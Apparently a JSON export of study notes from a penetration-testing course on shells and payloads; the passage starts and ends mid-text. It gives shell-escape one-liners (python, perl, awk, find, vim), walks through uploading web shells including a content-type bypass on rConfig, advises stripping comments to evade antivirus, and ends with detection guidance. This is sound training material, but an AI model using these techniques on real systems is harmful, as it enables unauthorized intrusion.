Unix/Linux\n\n```shell-session\npython -c 'import pty; pty.spawn(\"/bin/sh\")' \n\nsh-4.2$         \nsh-4.2$ whoami\nwhoami\napache\n```\n\nThis command uses python to import the [pty module](https://docs.python.org/3/library/pty.html), then uses the `pty.spawn` function to execute the `bourne shell binary` (`/bin/sh`). We now have a prompt (`sh-4.2$`) and access to more system commands to move about the system as we please.\n\n`Now, let's test our knowledge with some challenge questions.`",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/12-Spawning Interactive Shells",
    "path": "02_CPTS/07-Shells & Payloads/12-Spawning Interactive Shells.md",
    "title": "12 Spawning Interactive Shells",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "At the end of the last section, we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell ...",
    "category": "02_CPTS",
    "content": "At the end of the last section, we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell to give us access to more commands and a prompt to work from. This will likely be a situation we find ourselves in more and more as we practice on Hack The Box and in the real world on engagements.\n\nThere may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them.\n\nKnow that whenever we see `/bin/sh` or `/bin/bash`, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across `bourne shell` (`/bin/sh`) and `bourne again shell` (`/bin/bash`) present on the system natively.\n\n---\n\n## /bin/sh -i\n\nThis command will execute the shell interpreter specified in the path in interactive mode (`-i`).\n\n#### Interactive\n\nSpawning Interactive Shells\n\n```shell-session\n/bin/sh -i\nsh: no job control in this shell\nsh-4.2$\n```\n\n---\n\n## Perl\n\nIf the programming language [Perl](https://www.perl.org) is present on the system, these commands will execute the shell interpreter specified.\n\n#### Perl To Shell\n\nSpawning Interactive Shells\n\n```shell-session\nperl —e 'exec \"/bin/sh\";'\n```\n\nSpawning Interactive Shells\n\n```shell-session\nperl: exec \"/bin/sh\";\n```\n\nThe command directly above should be run from a script.\n\n---\n\n## Ruby\n\nIf the programming language [Ruby](https://www.ruby-lang.org/en/) is present on the system, this command will execute the shell interpreter specified:\n\n#### Ruby To Shell\n\nSpawning Interactive Shells\n\n```shell-session\nruby: exec \"/bin/sh\"\n```\n\nThe command directly above should be run from a script.\n\n---\n\n## Lua\n\nIf the programming language [Lua](https://www.lua.org) is present on the system, we can use the `os.execute` method to execute the shell interpreter specified using the full command below:\n\n#### Lua To Shell\n\nSpawning Interactive Shells\n\n```shell-session\nlua: os.execute('/bin/sh')\n```\n\nThe command directly above should be run from a script.\n\n---\n\n## AWK\n\n[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html) is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below:\n\n#### AWK To Shell\n\nSpawning Interactive Shells\n\n```shell-session\nawk 'BEGIN {system(\"/bin/sh\")}'\n```\n\n---\n\n## Find\n\n[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.\n\n#### Using Find For A Shell\n\nSpawning Interactive Shells\n\n```shell-session\nfind / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;\n```\n\nThis use of the find command is searching for any file listed after the `-name` option, then it executes `awk` (`/bin/awk`) and runs the same script we discussed in the awk section to execute a shell interpreter.\n\n---\n\n## Using Exec To Launch A Shell\n\nSpawning Interactive Shells\n\n```shell-session\nfind . -exec /bin/sh \\; -quit\n```\n\nThis use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly. If `find` can't find the specified file, then no shell will be attained.\n\n---\n\n## VIM\n\nYes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.\n\n#### Vim To Shell\n\nSpawning Interactive Shells\n\n```shell-session\nvim -c ':!/bin/sh'\n```\n\n#### Vim Escape\n\nSpawning Interactive Shells\n\n```shell-session\nvim\n:set shell=/bin/sh\n:shell\n```\n\n---\n\n## Execution Permissions Considerations\n\nIn addition to knowing about all the options listed above, we should be mindful of the permissions we have with the shell session's account. We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary:\n\n#### Permissions\n\nSpawning Interactive Shells\n\n```shell-session\nls -la <path/to/fileorbinary>\n```\n\nWe can also attempt to run this command to check what `sudo` permissions the account we landed on has:\n\n#### Sudo -l\n\nSpawning Interactive Shells\n\n```shell-session\nsudo -l\nMatching Defaults entries for apache on ILF-WebSrv:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser apache may run the following commands on ILF-WebSrv:\n    (ALL : ALL) NOPASSWD: ALL\n```\n\nThe sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/13-Introduction to Web Shells",
    "path": "02_CPTS/07-Shells & Payloads/13-Introduction to Web Shells.md",
    "title": "13 Introduction To Web Shells",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- It is almost guaranteed that we will come across web servers in our time learning and actively engaging in the practice of pentesting. Much of the world's software services are moving to web-based...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nIt is almost guaranteed that we will come across web servers in our time learning and actively engaging in the practice of pentesting. Much of the world's software services are moving to web-based platforms accessible over the world wide web using a web browser and HTTP/S. Just consider the website we are on now. It is entirely in the browser, accessible from anywhere in the world using any Internet-connected device. Modern entertainment mediums like `video games`, `music`, and `video streaming` are accessible through browsers and apps. This means we will find ourselves targeting web applications more and more as time goes on.\n\nFurthermore, during external penetration tests, we often find that clients' perimeter networks are well-hardened. They do not expose vulnerable services such as SMB or other elements that we used to frequently encounter. Those elements we now primarily anticipate during an internal penetration test. During our external penetration tests, we most commonly \"get in\" (gain a foothold inside the internal network) via web application attacks (file upload attacks, SQL injection, RFI/LFI, command injection, etc.), password spraying (against RDS, VPN portals, Citrix, OWA, and other applications using Active Directory authentication), and social engineering.\n\nWeb applications are often the majority of what we see exposed during an external network assessment and often present an enormous attack surface. We may find publicly available file upload forms that let us directly upload a PHP, JSP, or ASP.NET web shell. Some functionality during authenticated testing may be present or, our personal favorite, a self-registration functionality where we can go in and upload a web shell (after bypassing client-side checks) in the user profile picture upload area. We may also come across applications such as Tomcat, Axis2, or WebLogic, which allow you to deploy JSP code via a WAR file as part of their functionality. We may even find a misconfigured FTP service that allows file uploads directly to the server's webroot. There are many other ways that we may find to upload a web shell that is outside the scope of this module. What comes next once we have identified an unrestricted upload vulnerability or misconfiguration?\n\n---\n\n## What is a Web Shell?\n\nA `web shell` is a browser-based shell session we can use to interact with the underlying operating system of a web server. Again, to gain remote code execution via web shell, we must first find a website or web application vulnerability that can give us file upload capabilities. Most web shells are gained by uploading a payload written in a web language on the target server. The payload(s) we upload should give us remote code execution capability within the browser. The proceeding sections and challenges will primarily be focused on executing commands through our web shells in the browser. Still, it is essential to know that relying on the web shell alone to interact with the system can be unstable and unreliable because some web applications are configured to delete file uploads after a certain period of time. To achieve persistence on a system, in many cases, this is the initial way of gaining remote code execution via a web application, which we can then use to later upgrade to a more interactive reverse shell.\n\nIn the following few sections, we will learn and experiment with various web shells that allow us to interact with a web server's underlying OS through the web browser.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/14-Laudanum, One Webshell to Rule Them All",
    "path": "02_CPTS/07-Shells & Payloads/14-Laudanum, One Webshell to Rule Them All.md",
    "title": "14 Laudanum, One Webshell To Rule Them All",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more....",
    "category": "02_CPTS",
    "content": "\n---\n\nLaudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum). Let's examine Laudanum and see how it works.\n\n---\n\n## Working with Laudanum\n\nThe Laudanum files can be found in the `/usr/share/laudanum` directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your `attacking` host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.\n\n---\n\n## Laudanum Demonstration\n\nNow that we understand what Laudanum is and how it works, let's look at a web application we have found in our lab environment and see if we can run a web shell. If you wish to follow along with this demonstration, you will need to add an entry into your `/etc/hosts` file on your attack VM or within Pwnbox for the host we are attacking. That entry should read: `<target ip> status.inlanefreight.local`. Once this is done, you can play and explore this demonstration as long as you are on the VPN or using Pwnbox.\n\n#### Move a Copy for Modification\n\nLaudanum, One Webshell to Rule Them All\n\n```shell-session\ndrxh3kr@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx\n```\n\nAdd your IP address to the `allowedIps` variable on line `59`. Make any other changes you wish. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.\n\n#### Modify the Shell for Use\n\n![The image shows a code snippet in a text editor. It highlights an array of allowed IP addresses, including \"10.10.14.12\". A yellow arrow points to this line, indicating its significance.](https://academy.hackthebox.com/storage/modules/115/modify-shell.png)\n\nWe are taking advantage of the upload function at the bottom of the status page(`Green Arrow`) for this to work. Select your shell file and hit upload. If successful, it should print out the path to where the file was saved (Yellow Arrow). Use the upload function. Success prints out where the file went, navigate to it.\n\n#### Take Advantage of the Upload Function\n\n![The image shows a server status page with BIOS, disk, and services information. Several services are marked as \"Stopped\" in red. A section for importing configuration files is highlighted with a yellow arrow pointing to the file path and a green arrow pointing to the \"Upload File\" button.](https://academy.hackthebox.com/storage/modules/115/laud-upload.png)\n\nOnce the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the `\\\\files\\` directory, and the name was kept the same. This won't always be the case. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. For now, we are lucky that's not the case. With this particular web application, our file went to `status.inlanefreight.local\\\\files\\demo.aspx` and will require us to browse for the upload by using that \\ in the path instead of the / like normal. Once you do this, your browser will clean it up in your URL window to appear as `status.inlanefreight.local//files/demo.aspx`.\n\n#### Navigate to Our Shell\n\n![The image shows a Laundanum ASPX Shell interface with a command input field labeled \"cmd /c\" and a \"Submit Query\" button. A green arrow points to the URL \"status.inlanefreight.local/files/demo.aspx\" in the browser's address bar.](https://academy.hackthebox.com/storage/modules/115/laud-nav.png)\n\nWe can now utilize the Laudanum shell we uploaded to issue commands to the host. We can see in the example that the `systeminfo` command was run.\n\n#### Shell Success\n\n![The image shows a Laundanum ASPX Shell interface displaying system information. It includes details like host name, OS version, manufacturer, system type, processor, memory, and network card information. The command \"systeminfo\" is executed, and the output is shown under \"STDOUT\" in the browser window.](https://academy.hackthebox.com/storage/modules/115/laud-success.png)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/15-Antak Webshell",
    "path": "02_CPTS/07-Shells & Payloads/15-Antak Webshell.md",
    "title": "15 Antak Webshell",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- ASPX and a Quick Learning Tip Before diving into aspx shell concepts and exercises, we should take the time to cover a learning resource that can help reinforce most of the concepts covered here i...",
    "category": "02_CPTS",
    "content": "\n---\n\n## ASPX and a Quick Learning Tip\n\nBefore diving into aspx shell concepts and exercises, we should take the time to cover a learning resource that can help reinforce most of the concepts covered here in HTB Academy. Occasionally it can be a challenge to visualize a concept using just one learning method. It is good to supplement reading with watching demonstrations and performing hands-on as we have been doing thus far. Video walkthroughs can be an amazing way to learn concepts, plus they can be consumed casually (eating lunch, laying in bed, sitting on the couch, etc.). One great resource to use in learning is `IPPSEC's` blog site [ippsec.rocks](https://ippsec.rocks/?#). The site is a powerful learning tool. Take, for example, the concept of web shells. We can use his site to type in the concept we want to learn, like aspx.\n\n![The image shows a list of IPPSEC videos and courses related to ASPX. It includes titles like \"Cereal,\" \"RE,\" \"Bounty,\" \"Silo,\" \"Minion,\" and \"Granny and Grandpa,\" with descriptions of tasks such as hosting an ASPX file and using Gobuster to find ASPX pages.](https://academy.hackthebox.com/storage/modules/115/ippsecrocks.png)\n\nHis site crawls the descriptions of each of the videos he has posted on YouTube and recommends a timestamp associated with that keyword. When we click one of the links, it will take us to that section of the video where this concept is demonstrated. It's like a search engine to learn hacking skills. To gain a good basic understanding of what an aspx web shell is, let's watch the short portion of IPPSEC's demonstration of the retired box [Cereal](https://www.youtube.com/watch?v=04ZBIioD5pA&t=4677s). The link should start us at the 1-hour 17-minute mark. Watch from 1 hour 17-minute mark to the 1-hour 20-minute mark.\n\nWe will notice that he uploaded the file via HTTP then navigated to the file using the web browser. This gave him the capability to send commands to and receive output from the underlying Windows operating system.\n\n`How does aspx work?`\n\n---\n\n## ASPX Explained\n\n`Active Server Page Extended` (`ASPX`) is a file type/extension written for [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview). On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the Antak Webshell.\n\n---\n\n## Antak Webshell\n\nAntak is a web shell built in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on `Antak`. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It's time to dive in and experiment with Antak.\n\n---\n\n## Working with Antak\n\nThe Antak files can be found in the `/usr/share/nishang/Antak-WebShell` directory.\n\nAntak Webshell\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls /usr/share/nishang/Antak-WebShell\n\nantak.aspx  Readme.md\n```\n\nAntak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.\n\n---\n\n## Antak Demonstration\n\nNow that we understand what Antak is and how it works let's put it to the test against the same web application from the Laudanum section. If you wish to follow along with this demonstration, you will need to add an entry into your `/etc/hosts` file on your attack VM or within Pwnbox for the host we are attacking. That entry should read: `<target ip> status.inlanefreight.local`. Once this is done, as long as you are on the VPN or using Pwnbox, you can also play and explore this demonstration.\n\n#### Move a Copy for Modification\n\nAntak Webshell\n\n```shell-session\ndrxh3kr@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx\n```\n\nMake sure you set credentials for access to the web shell. Modify `line 14`, adding a user (green arrow) and password (orange arrow). This comes into play when you browse to your web shell, much like Laudanum. This can help make your operations more secure by ensuring random people can't just stumble into using the shell. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.\n\n#### Modify the Shell for Use\n\n![The image shows a code snippet with a conditional statement checking if the username is \"Disclaimer\" and the password is \"ForLegitUseOnly\". If true, it sets execution visibility and enables it. Green and orange arrows highlight the username and password conditions.](https://academy.hackthebox.com/storage/modules/115/antak-changes.png)\n\nFor the sake of demonstrating the tool, we are uploading it to the same status portal we used for Laudanum. That host was a Windows host, so our shell should work just fine with PowerShell. Upload the file and then navigate to the page for use. It will give you a user and password prompt. Remember, with this web application, the files are stored in the `\\\\files\\` directory. When you navigate to the `upload.aspx` file, you should see a prompt as we have below.\n\n#### Shell Success\n\n![The image shows a login form for the Antak Webshell with fields for username and password, both filled with \"htb-student\". A \"Login\" button is present below the fields. The URL in the browser's address bar is \"status.inlanefreight.local/files/upload.aspx\".](https://academy.hackthebox.com/storage/modules/115/antak-creds-prompt.png)\n\nAs seen in the following image, we will be granted access if our credentials are entered properly.\n\n![The image shows the Antak Webshell interface with a blue command prompt area displaying the message: \"Welcome to Antak - A Webshell which utilizes PowerShell. Use help for more details. Use clear to clear the screen.\" Below are buttons labeled \"Submit,\" \"Browse,\" \"Upload the File,\" \"Encode and Execute,\" \"Download,\" \"Parse web.config,\" \"Execute SQL Query,\" and a field for entering a connection string.](https://academy.hackthebox.com/storage/modules/115/antak-success.png)\n\nNow that we have access, we can utilize PowerShell commands to navigate and take actions against the host. We can issue basic commands from the Antak shell window, upload and download files, encode and execute scripts, and much more (green arrow below). This is an excellent way to utilize a Webshell to deliver us a callback to our command and control platform. We could upload the payload via the Upload function or use a PowerShell one-liner to download and execute the shell for us. If you feel unsure where to start, issue the command `help` in the prompt window (orange arrow ) below.\n\n#### Issuing Commands\n\n![The image shows a command prompt window listing files and directories in two sections. The first section displays logs in a directory, and the second section lists user directories under \"C:\\Users\". Below the command output, there are buttons labeled \"Submit,\" \"Browse,\" \"Upload the File,\" \"Encode and Execute,\" and \"Download.\" An orange arrow points to the \"Submit\" button, and a green arrow points to the \"Encode and Execute\" button.](https://academy.hackthebox.com/storage/modules/115/antak-commands.png)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/16-PHP Web Shells",
    "path": "02_CPTS/07-Shells & Payloads/16-PHP Web Shells.md",
    "title": "16 PHP Web Shells",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Hypertext Preprocessor or PHP is an open-source general-purpose scripting language typically used as part of a web stack that powers a website. At the time of this writing (October 2021), PHP is the m...",
    "category": "02_CPTS",
    "content": "Hypertext Preprocessor or [PHP](https://www.php.net) is an open-source general-purpose scripting language typically used as part of a web stack that powers a website. At the time of this writing (October 2021), PHP is the most popular `server-side programming language`. According to a [recent survey](https://w3techs.com/technologies/details/pl-php) conducted by W3Techs, \"PHP is used by `78.6%` of all websites whose server-side programming language we know\".\n\nLet's consider a practical example of filling out the user account and password fields on a login web form.\n\n#### PHP Login Page\n\n![rConfig login page with fields for username and password, 'Remember me' checkbox, and 'Forgot my password' link.](https://academy.hackthebox.com/storage/modules/115/rconfig.png)\n\nRecall the rConfig server from earlier in this module? It uses PHP. We can see a `login.php` file. So when we select the login button after filling out the Username and Password field, that information is processed server-side using PHP. Knowing that a web server is using PHP gives us pentesters a clue that we may gain a PHP-based web shell on this system. Let's work through this concept hands-on.\n\n---\n\n## Hands-on With a PHP-Based Web Shell.\n\nSince PHP processes code & commands on the server-side, we can use pre-written payloads to gain a shell through the browser or initiate a reverse shell session with our attack box. In this case, we will take advantage of the vulnerability in rConfig 3.9.6 to manually upload a PHP web shell and interact with the underlying Linux host. In addition to all the functionality mentioned earlier, rConfig allows admins to add network devices and categorize them by vendor. Go ahead and log in to rConfig with the default credentials (admin:admin), then navigate to `Devices` > `Vendors` and click `Add Vendor`.\n\n#### Vendors Tab\n\n![rConfig vendor management page with options to add, edit, or remove vendors, fields for vendor name and logo upload, and save or close buttons.](https://academy.hackthebox.com/storage/modules/115/vendors_tab.png)\n\nWe will be using [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a `.php` file. Keep in mind that the file type is significant, as we will soon witness. Our goal is to upload the PHP web shell via the Vendor Logo `browse` button. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing `Burp Suite`.\n\nStart Burp Suite, navigate to the browser's network settings menu and fill out the proxy settings. `127.0.0.1` will go in the IP address field, and `8080` will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).\n\n#### Proxy Settings\n\n![Proxy settings dialog with options for no proxy, auto-detect, system settings, and manual configuration with HTTP proxy set to 127.0.0.1:8080.](https://academy.hackthebox.com/storage/modules/115/proxy_settings.png)\n\nOur goal is to change the `content-type` to bypass the file type restriction in uploading files to be \"presented\" as the vendor logo so we can navigate to that file and have our web shell.\n\nNote: `Firefox` removed `FTP` support starting with [version 90](https://www.mozilla.org/en-US/firefox/90.0/releasenotes/).\n\n---\n\n## Bypassing the File Type Restriction\n\nWith Burp open and our web browser proxy settings properly configured, we can now upload the PHP web shell. Click the browse button, navigate to wherever our .php file is stored on our attack box, and select open and `Save` (we may need to accept the PortSwigger Certificate). It will seem as if the web page is hanging, but that's just because we need to tell Burp to forward the HTTP requests. Forward requests until you see the POST request containing our file upload. It will look like this:\n\n#### Post Request\n\n![Burp Suite showing intercepted HTTP request with headers and PHP code snippet.](https://academy.hackthebox.com/storage/modules/115/burp.png)\n\nAs mentioned in an earlier section, you will notice that some payloads have comments from the author that explain usage, provide kudos and links to personal blogs. This can give us away, so it's not always best to leave the comments in place. We will change Content-type from `application/x-php` to `image/gif`. This will essentially \"trick\" the server and allow us to upload the .php file, bypassing the file type restriction. Once we do this, we can select `Forward` twice, and the file will be submitted. We can turn the Burp interceptor off now and go back to the browser to see the results.\n\n#### Vendor Added\n\n![Vendor management page showing added vendor 'NetVen' with options to add, edit, or remove vendors, and a table listing 'Cisco' and 'NetVen'.](https://academy.hackthebox.com/storage/modules/115/added_vendor.png)\n\nThe message: `Added new vendor NetVen to Database` lets us know our file upload was successful. We can also see the NetVen vendor entry with the logo showcasing a ripped piece of paper. This means rConfig did not recognize the file type as an image, so it defaulted to that image. We can now attempt to use our web shell. Using the browser, navigate to this directory on the rConfig server:\n\n`/images/vendor/connect.php`\n\nThis executes the payload and provides us with a non-interactive shell session entirely in the browser, allowing us to execute commands on the underlying OS.\n\n#### Webshell Success\n\n![Web interface for fetching files with fields for host, port, path, command execution, and sudo output showing allowed commands.](https://academy.hackthebox.com/storage/modules/115/web_shell_now.png)\n\n---\n\n## Considerations when Dealing with Web Shells\n\nWhen utilizing web shells, consider the below potential issues that may arise during your penetration testing process:\n\n- Web applications sometimes automatically delete files after a pre-defined period\n- Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. `whoami && hostname`), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell\n- Greater chance of leaving behind proof that we were successful in our attack\n\nDepending on the engagement type (i.e., a black box evasive assessment), we may need to attempt to go undetected and `cover our tracks`. We are often helping our clients test their capabilities to detect a live threat, so we should emulate as much as possible the methods a malicious attacker may attempt, including attempting to operate stealthily. This will help our client and save us in the long run from having files discovered after an engagement period is over. In most cases, when attempting to gain a shell session with a target, it would be wise to establish a reverse shell and then delete the executed payload. Also, we must document every method we attempt, what worked & what did not work, and even the names of the payloads & files we tried to use. We could include a sha1sum or MD5 hash of the file name, upload locations in our reports as proof, and provide attribution.\n\n`Now let's test our understanding with some challenge questions`.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/18-Detection & Prevention",
    "path": "02_CPTS/07-Shells & Payloads/18-Detection & Prevention.md",
    "title": "18 Detection & Prevention",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- We are on the downslope now! Let's take a break from our super-spy business of infiltrating hosts and take a look at the defensive side. This section explores ways to detect active shells, look fo...",
    "category": "02_CPTS",
    "content": "\n---\n\nWe are on the downslope now! Let's take a break from our super-spy business of infiltrating hosts and take a look at the defensive side. This section explores ways to detect active shells, look for payloads on a host and over network traffic, and how these attacks can be obfuscated to bypass our defenses.\n\n---\n\n## Monitoring\n\nWhen it comes to looking for and identifying active shells, payload delivery and execution, and potential attempts to subvert our defenses, we have many different options to utilize to detect and respond to these events. Before talking about data sources and tools we can use, let's take a second to talk about the [MITRE ATT&CK Framework](https://attack.mitre.org/) and define the techniques and tactics being utilized by attackers. The `ATT&CK Framework` as defined by MITRE, is \"`a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations`.\"\n\n#### ATT&CK Framework\n\n![MITRE ATT&CK Enterprise Framework matrix showing tactics like Initial Access, Execution, Persistence, and techniques under each category.](https://academy.hackthebox.com/storage/modules/115/attack-framework.png)\n\nKeeping the framework in mind, three of the most notable techniques we can tie to Shells & Payloads are listed below in the table with descriptions.\n\n---\n\n#### Notable MITRE ATT&CK Tactics and Techniques:\n\n|**Tactic / Technique**|**Description**|\n|---|---|\n|[Initial Access](https://attack.mitre.org/techniques/T1190/)|Attackers will attempt to gain initial access by compromising a public-facing host or service such as web Applications, misconfigured services such as SMB or authentication protocols, and/or bugs in a public-facing host that introduce a vulnerability. This is often done on some form of bastion host and provides the attacker with a foothold in the network but not yet full access. For more information on initial access, especially via Web Applications, check out the [OWASP Top Ten](https://owasp.org/www-project-top-ten/) or read further in the Mitre Att&ck framework.|\n|[Execution](https://attack.mitre.org/tactics/TA0002)|This technique depends on code supplied and planted by an attacker running on the victim host. `The Shells & Payloads` module focuses mainly on this tactic. We utilize many different payloads, delivery methods, and shell scripting solutions to access a host. This can be anything from the execution of commands within our web browser to get execution and access on a Web Application, issuing a PowerShell one-liner via PsExec, taking advantage of a publicly released exploit or zero-day in conjunction with a framework such as Metasploit, or uploading a file to a host via many different protocols and calling it remotely to receive a callback.|\n|[Command & Control](https://attack.mitre.org/tactics/TA0011)|Command and Control (`C2`) can be looked at as the culmination of our efforts within this module. We gain access to a host and establish some mechanism for continued and/or interactive access via code execution, then utilize that access to perform follow on actions on objectives within the victim network. The use of standard ports and protocols within the victim network to issue commands and receive output from the victim is common. This can appear as anything from normal web traffic over HTTP/S, commands issued via other common external protocols such as DNS and NTP, and even the use of common allowed applications such as Slack, Discord, or MS Teams to issue commands and receive check-ins. C2 can have various levels of sophistication varying from basic clear text channels like Netcat to utilizing encrypted and obfuscated protocols along with complex traffic routes via proxies, redirectors, and VPNs.|\n\n---\n\n## Events To Watch For:\n\n- `File uploads`: Especially with Web Applications, file uploads are a common method of acquiring a shell on a host besides direct command execution in the browser. Pay attention to application logs to determine if anyone has uploaded anything potentially malicious. The use of firewalls and anti-virus can add more layers to your security posture around the site. Any host exposed to the internet from your network should be sufficiently hardened and monitored.\n    \n- `Suspicious non-admin user actions`: Looking for simple things like normal users issuing commands via Bash or cmd can be a significant indicator of compromise. When was the last time an average user, much less an admin, had to issue the command `whoami` on a host? Users connecting to a share on another host in the network over SMB that is not a normal infrastructure share can also be suspicious. This type of interaction usually is end host to infrastructure server, not end host to end host. Enabling security measures such as logging all user interactions, PowerShell logging, and other features that take note when a shell interface is used will provide you with more insight.\n    \n- `Anomalous network sessions`: Users tend to have a pattern they follow for network interaction. They visit the same websites, use the same applications, and often perform those actions multiple times a day like clockwork. Logging and parsing NetFlow data can be a great way to spot anomalous network traffic. Looking at things such as top talkers, or unique site visits, watching for a heartbeat on a nonstandard port (like 4444, the default port used by Meterpreter), and monitoring any remote login attempts or bulk GET / POST requests in short amounts of time can all be indicators of compromise or attempted exploitation. Using tools like network monitors, firewall logs, and SIEMS can help bring a bit of order to the chaos that is network traffic.\n    \n\n---\n\n## Establish Network Visibility\n\nMuch like identifying and then using various shells & payloads, `detection` & `prevention` requires a detailed understanding of the systems and overall network environment you are trying to protect. It's always essential to have good documentation practices so individuals responsible for keeping the environment secure can have consistent visibility of the devices, data, and traffic flow in the environments they administer. Developing & maintaining visual network topology diagrams can help visualize network traffic flow. Newer tools like [netbrain](https://www.netbraintech.com) may be good to research as they combine visual diagraming that can be achieved with tools like [Draw.io](https://draw.io), documentation and remote management. Interactive visual network topologies allow you to interact with the routers, network firewalls, IDS/IPS appliances, switches, and hosts (clients). Tools like this are becoming more common to use as it can be challenging to keep the visibility of the network updated, especially in larger environments that are constantly growing.\n\nSome network device vendors like Cisco Meraki, Ubiquiti, Check Point, and Palo Alto Networks are building layer 7 visibility (like layer 7 of the OSI model) into their network devices and moving the management capabilities to cloud-based network controllers. This means admins log in to a web portal to manage all the network devices in the environment. A visual dashboard is often provided with these cloud-based network controllers making it easier to have a `baseline` of the traffic usage, network protocols, applications, and inbound & outbound traffic. Having and understanding the baseline of your network will make any deviation from the norm extremely visible. The faster you can react and triage any potential issue, the less time for possible leaks, destruction of data, or worse.\n\nKeep in mind that if a payload is successfully executed, it will need to communicate over the network, so this is why network visibility is essential within the context of shells & payloads. Having a network security appliance capable of [deep packet inspection](https://en.wikipedia.org/wiki/Deep_packet_inspection) can often act as an anti-virus for the network. Some of the payloads we discussed could get detected & blocked at the network level if successfully executed on the hosts. This is especially easy to detect if traffic is not encrypted. When we used Netcat in the bind & reverse shell sections, the traffic passing between the source and destination (target) was `not encrypted`. Someone could capture that traffic and see every command we sent between our attack box and the target, as seen in the examples below.\n\nThis image shows NetFlow between two hosts frequently and on a suspicious port (`4444`). We can tell it is basic TCP traffic, so if we take action and inspect it a bit, we can see what's going on.\n\n---\n\n#### Suspicious Traffic.. In Clear Text\n\n![Wireshark displaying TCP packet capture with source and destination IPs, protocol details, and hex data view.](https://academy.hackthebox.com/storage/modules/115/pcap-4444.png)\n\nNotice now that that same traffic has been expanded, and we can see that someone is using `net` commands to create a new user on this host.\n\n---\n\n#### Following the Traffic\n\n![Wireshark TCP stream showing commands for directory listing and user creation with net user and net localgroup commands.](https://academy.hackthebox.com/storage/modules/115/follow-sus.png)\n\nThis is an excellent example of basic access and command execution to gain persistence via the addition of a user to the host. Regardless of the name `hacker` being used, if command-line logging is in place paired with the NetFlow data, we can quickly tell that the user is performing potentially malicious actions and triage this event to determine if an incident has occurred or if this is just some admin playing around. A modern security appliance may detect, alert and prevent further network communications from that host using deep packet inspection.\n\nSpeaking of anti-virus, let's discuss end device 